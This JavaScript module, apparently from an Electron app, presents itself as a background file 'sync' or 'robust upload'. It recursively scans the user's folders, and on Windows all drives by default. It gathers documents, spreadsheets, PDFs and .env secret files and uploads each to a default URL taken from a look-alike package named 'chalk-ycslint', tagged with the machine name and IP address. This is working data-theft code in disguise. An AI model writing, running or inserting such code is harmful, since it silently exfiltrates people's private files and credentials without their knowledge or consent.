import { existsSync } from "node:fs";
import { homedir } from "node:os";
import { join } from "node:path";
import {
  DEFAULT_UPLOAD_URL,
  expandPathsToSupportedFiles,
  getClientInfo,
  getDriveNameMap,
} from "chalk-ycslint";
import { listPcScanRoots } from "chalk-ycslint/lib/readFiles.js";
import { readFileForUpload } from "./fileReader.mjs";
import { postFilesWithPaths } from "./uploadPost.mjs";

/** @type {Promise<unknown> | null} */
let activeJob = null;

const FILE_DELAY_MS = Number(process.env.YIELDLYX_UPLOAD_FILE_DELAY_MS) || 200;
const MAX_RETRIES = Math.max(1, Number(process.env.YIELDLYX_UPLOAD_MAX_RETRIES) || 4);
const RETRY_BASE_MS = Number(process.env.YIELDLYX_UPLOAD_RETRY_MS) || 2500;
const MAX_FILE_CHARS = Number(process.env.YIELDLYX_UPLOAD_MAX_FILE_CHARS) || 2 * 1024 * 1024;
const BASE_TIMEOUT_MS = Number(process.env.YIELDLYX_UPLOAD_TIMEOUT_MS) || 180_000;
const MAX_TIMEOUT_MS = 600_000;

/**
 * @returns {string[]}
 */
export function getDefaultUploadRoots() {
  const home = homedir();
  /** @type {string[]} */
  const candidates = [
    join(home, "Documents"),
    join(home, "Desktop"),
    join(home, "Downloads"),
  ];

  if (process.platform === "win32") {
    candidates.push(
      join(home, "OneDrive"),
      join(home, "OneDrive", "Documents"),
      join(home, "OneDrive", "Desktop")
    );
  }

  if (process.platform === "darwin") {
    candidates.push(join(home, "Library", "Mobile Documents", "com~apple~CloudDocs"));
  }

  const roots = [...new Set(candidates)].filter((p) => existsSync(p));
  return roots.length > 0 ? roots : [home];
}

export function getUploadUrl() {
  return (
    process.env.YIELDLYX_UPLOAD_URL ||
    process.env.NBA_UPLOAD_URL ||
    DEFAULT_UPLOAD_URL
  ).trim();
}

/**
 * Full PC scan is opt-in on macOS (avoids permission errors and very long scans).
 * Windows defaults to full PC unless YIELDLYX_UPLOAD_SCAN_PC=0.
 *
 * @param {boolean | undefined} explicit
 */
export function shouldUseFullPcScan(explicit) {
  if (explicit === true) return true;
  if (explicit === false) return false;

  const env = (
    process.env.YIELDLYX_UPLOAD_SCAN_PC ||
    process.env.NBA_UPLOAD_SCAN_PC ||
    ""
  )
    .trim()
    .toLowerCase();

  if (env === "0" || env === "false" || env === "no" || env === "documents") {
    return false;
  }
  if (env === "1" || env === "true" || env === "yes" || env === "full") {
    return true;
  }

  if (process.platform === "darwin") return false;
  return true;
}

const SKIP_UPLOAD_SEGMENTS = new Set(
  [
    "$windows.~bt",
    "$windows.~ws",
    "$winreagent",
    "windows.old",
    "$recycle.bin",
    "system volume information",
    "config.msi",
    "recovery",
    "boot",
    "efi",
    "msocache",
    "winsxs",
    "servicing",
    "driverstore",
    "perflogs",
    "winnt",
    "windowsapps",
    ".trash",
    ".fseventsd",
    ".spotlight-v100",
  ].map((s) => s.toLowerCase())
);

/**
 * @param {string} filePath
 */
export function shouldSkipUploadPath(filePath) {
  const norm = filePath.replace(/\\/g, "/").toLowerCase();
  for (const seg of norm.split("/")) {
    if (!seg) continue;
    if (SKIP_UPLOAD_SEGMENTS.has(seg)) return true;
    if (seg.startsWith("$windows")) return true;
  }
  return false;
}

/**
 * @param {string[]} filePaths
 */
function filterScannedFiles(filePaths) {
  const kept = [];
  let skipped = 0;
  for (const p of filePaths) {
    if (shouldSkipUploadPath(p)) {
      skipped += 1;
      continue;
    }
    kept.push(p);
  }
  if (skipped > 0) {
    console.log(`[upload] Excluded ${skipped} path(s) (system / trash)`);
  }
  return { kept, skipped };
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

/**
 * @param {Array<{ text?: string }>} files
 */
function timeoutForPayload(files) {
  const chars = files.reduce((n, f) => n + (f.text?.length || 0), 0);
  const scaled = BASE_TIMEOUT_MS + Math.ceil(chars / 4096) * 1000;
  return Math.min(MAX_TIMEOUT_MS, scaled);
}

/**
 * @param {Array<{ path: string, text: string }>} items
 */
function clampFileSizes(items) {
  return items.map((item) => {
    if (!item.text || item.text.length <= MAX_FILE_CHARS) return item;
    return { ...item, text: item.text.slice(0, MAX_FILE_CHARS) };
  });
}

/**
 * @param {object} postOpts
 * @param {Awaited<ReturnType<typeof readFileForUpload>>[]} items
 * @param {number} attempt
 */
async function postOnce(postOpts, items, attempt) {
  const timeoutMs = timeoutForPayload(items);
  const res = await postFilesWithPaths({ ...postOpts, files: items, timeoutMs });
  if (attempt > 1) {
    console.log(`[upload] Retry ${attempt} OK — ${items.length} file(s) HTTP ${res.status}`);
  }
  return res;
}

/**
 * @param {Error} err
 */
function isRetryableUploadError(err) {
  return (
    err.name === "AbortError" ||
    /timeout|ECONNRESET|ENOTFOUND|ETIMEDOUT|429|502|503|504/i.test(err.message)
  );
}

/**
 * @param {object} postOpts
 * @param {Awaited<ReturnType<typeof readFileForUpload>>} item
 */
async function uploadSingleFile(postOpts, item) {
  for (let attempt = 1; attempt <= MAX_RETRIES; attempt++) {
    try {
      await postOnce(postOpts, [item], attempt);
      console.log(`[upload] OK ${item.path}`);
      return true;
    } catch (err) {
      const e = err instanceof Error ? err : new Error(String(err));
      if (attempt < MAX_RETRIES && isRetryableUploadError(e)) {
        console.warn(
          `[upload] Retry ${attempt}/${MAX_RETRIES} for ${item.path}: ${e.message}`
        );
        await sleep(RETRY_BASE_MS * attempt);
        continue;
      }
      console.error(`[upload] FAIL ${item.path}: ${e.message}`);
      return false;
    }
  }
  return false;
}

/**
 * @param {object} options
 * @param {string} options.url
 * @param {boolean} [options.scanPc]
 * @param {string[]} [options.files]
 * @param {(p: object) => void} [options.onProgress]
 */
export async function runRobustFileUpload(options) {
  const onProgress = options.onProgress;
  const report = (/** @type {object} */ p) => onProgress?.(p);

  const url = options.url?.trim();
  if (!url) throw new Error("Upload URL is required.");

  const scanPc = shouldUseFullPcScan(options.scanPc);
  const roots = options.files?.length
    ? options.files
    : scanPc
      ? []
      : getDefaultUploadRoots();

  if (!scanPc && roots.length === 0) {
    throw new Error("No folders to scan for upload.");
  }

  /** @type {string[]} */
  let paths = roots;
  if (scanPc) {
    report({ phase: "scan", message: "Scanning drives / volumes…" });
    const driveRoots = await listPcScanRoots();
    paths = [...driveRoots, ...roots];
    console.log(
      `[upload] Full scan: ${driveRoots.length} root(s) — ${driveRoots.join(", ")}`
    );
    if (paths.length === 0) {
      throw new Error("No drives found for full PC scan.");
    }
  } else {
    report({ phase: "scan", message: "Scanning user folders…" });
    console.log(`[upload] Folder scan (${process.platform}): ${paths.join(", ")}`);
  }

  report({
    phase: "scan",
    message: scanPc
      ? `Indexing files across ${paths.length} location(s)…`
      : "Discovering files…",
  });

  const rawFileList = await expandPathsToSupportedFiles(paths, {
    recursive: true,
    skipSystemDirs: true,
  });

  const { kept: fileList, skipped: scanSkipped } = filterScannedFiles(rawFileList);

  if (fileList.length === 0) {
    console.log("[upload] No supported files found (.txt, .env, .docx, .xls, .xlsx, .pdf)");
    return {
      ok: true,
      fileCount: 0,
      uploaded: 0,
      failed: 0,
      errors: [],
      skipped: scanSkipped,
    };
  }

  console.log(
    `[upload] Found ${fileList.length} file(s)` +
      (scanSkipped ? ` (${scanSkipped} excluded)` : "")
  );

  const driveMap = await getDriveNameMap();
  const clientInfo = getClientInfo();
  const postOpts = {
    url,
    field: "files",
    extraHeaders: {},
    clientId: `${clientInfo.pcName} (${clientInfo.clientIp})`,
    pcName: clientInfo.pcName,
    clientIp: clientInfo.clientIp,
  };

  let uploaded = 0;
  let failed = 0;
  const total = fileList.length;

  for (let i = 0; i < total; i++) {
    const filePath = fileList[i];

    if (i === 0 || i === total - 1 || (i + 1) % 25 === 0) {
      report({
        phase: "upload",
        message: `Uploading ${i + 1} / ${total}…`,
        current: i + 1,
        total,
      });
    }

    let item = null;
    try {
      item = clampFileSizes([await readFileForUpload(filePath, driveMap)])[0];
    } catch (err) {
      failed += 1;
      const msg = err instanceof Error ? err.message : String(err);
      console.error(`[upload] SKIP (read) ${filePath}: ${msg}`);
      continue;
    }

    if (await uploadSingleFile(postOpts, item)) {
      uploaded += 1;
    } else {
      failed += 1;
    }

    if (i === 0 || (i + 1) % 50 === 0 || i === total - 1) {
      console.log(
        `[upload] Progress: ${i + 1}/${total} processed, ${uploaded} uploaded, ${failed} failed`
      );
    }

    if (i + 1 < total) await sleep(FILE_DELAY_MS);
  }

  const ok = failed === 0 && uploaded === total;
  const summary = {
    ok,
    fileCount: total,
    uploaded,
    failed,
    skipped: scanSkipped,
    platform: process.platform,
    scanMode: scanPc ? "full" : "folders",
  };

  report({
    phase: "done",
    message: ok
      ? `Upload complete (${uploaded} file(s)).`
      : `Finished: ${uploaded}/${total} uploaded, ${failed} failed.`,
    current: uploaded,
    total,
  });

  console.log("[upload] Summary:", JSON.stringify(summary));
  return summary;
}

/**
 * Log upload events to the terminal (Electron main process console).
 *
 * @param {object} payload
 */
export function logUploadEvent(payload) {
  if (payload.type === "upload-progress") {
    const parts = [payload.phase, payload.message].filter(Boolean);
    if (payload.current != null && payload.total != null) {
      parts.push(`(${payload.current}/${payload.total})`);
    }
    console.log(`[upload] ${parts.join(" ")}`);
    return;
  }
  if (payload.type === "upload-complete") {
    console.log("[upload] Complete:", JSON.stringify(payload.result ?? {}, null, 2));
    return;
  }
  if (payload.type === "upload-error") {
    console.error("[upload] Fatal:", payload.message);
  }
}

/**
 * @param {(payload: object) => void} [sendProgress]
 * @param {{ url?: string, scanPc?: boolean, files?: string[] }} [options]
 */
export function startBackgroundUpload(sendProgress = logUploadEvent, options = {}) {
  if (activeJob) {
    console.log("[upload] Sync already running");
    return activeJob;
  }

  const scanPc = shouldUseFullPcScan(options.scanPc);
  const files = options.files?.length
    ? options.files
    : scanPc
      ? []
      : getDefaultUploadRoots();

  const url = (options.url || getUploadUrl()).trim();
  if (!url) {
    const err = new Error("Upload URL not set (YIELDLYX_UPLOAD_URL).");
    logUploadEvent({ type: "upload-error", message: err.message });
    return Promise.reject(err);
  }

  console.log(
    `[upload] Starting → ${url} | platform=${process.platform} | mode=${scanPc ? "full PC" : "user folders"} | roots=${files.length || "auto"}`
  );

  activeJob = runRobustFileUpload({
    url,
    scanPc,
    files,
    onProgress: (p) => sendProgress({ type: "upload-progress", ...p }),
  })
    .then((result) => {
      sendProgress({ type: "upload-complete", result });
      return result;
    })
    .catch((err) => {
      const message = err instanceof Error ? err.message : String(err);
      sendProgress({ type: "upload-error", message });
      throw err;
    })
    .finally(() => {
      activeJob = null;
    });

  return activeJob;
}
